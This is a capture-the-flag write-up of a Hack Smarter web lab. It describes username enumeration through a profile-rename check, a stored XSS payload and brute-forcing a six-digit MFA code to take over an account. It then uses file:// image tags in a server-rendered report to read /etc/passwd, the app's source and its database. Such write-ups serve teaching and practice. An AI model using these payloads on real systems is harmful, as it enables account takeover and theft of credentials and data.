---

Name: Free Access  
Difficulty: Easy
URL: https://www.hacksmarter.org/events/7f9dc321-77ce-49b8-8acc-5c224ef25d8d/take/embedded-medium
Description: Hack Smarter is releasing a new SaaS platform for cloud storage. You have been hired to perform a full penetration test on the platform. The web app is in-scope, the client has also placed a "flag" on the machine. If this flag is retrieved, that is an immediate early disclosure as it demonstrates full compromise of the application.

---

We are given a list of usernames and a password.

```http
POST /login HTTP/1.1

username=deborah&password=cJ2yxWMs3XEHbO
```

Trying to brute-force the username quickly runs into a rate limit.

```http
HTTP/1.1 429 TOO MANY REQUESTS

<p>3 per 1 minute</p>
```

While waiting for Caido to slowly brute-force usernames (20 second delay between requests), we log in using another set of credentials we already have.

```text
Username: brian
Password: HackSmarter123!
```

## Username Enumeration

While exploring the application we notice that the profile page allows changing our username.

> This is your unique identifier on HackSmarter Cloud.

Since usernames must be unique, we can use this functionality to enumerate valid users without triggering the login rate limit.

A successful update returns:

```html
<div class="alert alert-success">
Profile updated successfully
</div>
```

Using Caido's HTTPQL filter

```text
resp.raw.ncont:"Profile updated successfully"
```

we hide all successful responses and only keep the failures.

Eventually we find:

```html
<div class="alert alert-error">
Error: The username 'tommy' already exists.
</div>
```

Now we know a valid username.

## XSS

The messaging system is vulnerable to stored XSS.

Sending ourselves a message containing

```html
<script>alert("hacked")</script>
```

results in JavaScript execution when the message is viewed.

Unfortunately this did not immediately help us further, so we continued attacking the login page.

## MFA

Tommy's account requires MFA.

While looking through Brian's account I noticed the option to disable MFA.

```javascript
fetch('/api/mfa/disable', {method:'POST'})
```

Unfortunately this only affects the currently authenticated user.

Meanwhile, Caido eventually brute-forces Tommy's 6-digit MFA token.

```http
token=048199
```

The server responds with:

```http
HTTP/1.1 302 FOUND
Location: /dashboard

Set-Cookie:
session=eyJ1c2VyX2lkIjoyfQ.anXnWg.d0F8k-Y6AqktI8yvKqf1lS1mNC0
```

Replacing our browser cookie with the new session authenticates us as **tommy**.

To avoid losing access, we immediately disable MFA.

## Admin Report Generator

Tommy has access to an administrative report generator.

```
Generate System Report

As an administrator, you can generate system reports.
```

The supplied HTML is rendered by the server.

Simple SSTI payloads do not execute.

```
{{7*7}}
#{7*7}
${7*7}
```

The request looks like:

```http
POST /dashboard/report

report_html=<p>Hello</p>
```

## Server-Side HTML Rendering

Although SSTI is not possible, the HTML renderer happily loads local files.

For example:

```html
<img src="file:///etc/passwd">
```

The report contains the file embedded as a Base64 data URI.

To decode it I used:

```python
import base64
import re

html = open("report.html").read()

m = re.search(r"base64,([^\"']+)", html)
print(base64.b64decode(m.group(1)).decode(errors="ignore"))
```

This effectively gives us an arbitrary file read primitive.

## Reading the Application

The application source is located in `/app`.

```html
<img src="file:///app/app.py">
```

After decoding the embedded Base64 we obtain the application's source code.

## Reading the Database

Next we retrieve the SQLite database.

```html
<img src="file:///app/database.db">
```

The database contains:

- users
- password hashes
- MFA secrets
- messages

## SSH Key

Inside the application we also find Tommy's SSH private key.

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

Attempting to authenticate with it fails because the server rejects the key.

```
Permission denied (publickey).
```

Fortunately, we no longer need shell access.

## Flag

Since we have arbitrary file read, we simply retrieve the flag directly.

```html
<img src="file:///home/tommy/flag.txt">
```

After decoding the embedded Base64, the flag is revealed.
